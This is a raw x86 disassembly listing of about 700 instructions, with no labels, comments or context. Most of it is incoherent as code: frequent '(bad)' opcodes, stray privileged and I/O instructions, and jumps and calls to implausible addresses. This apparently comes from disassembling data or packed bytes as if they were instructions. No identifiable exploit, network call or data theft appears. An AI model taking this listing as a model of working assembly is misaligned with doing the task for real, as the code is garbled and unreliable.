  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
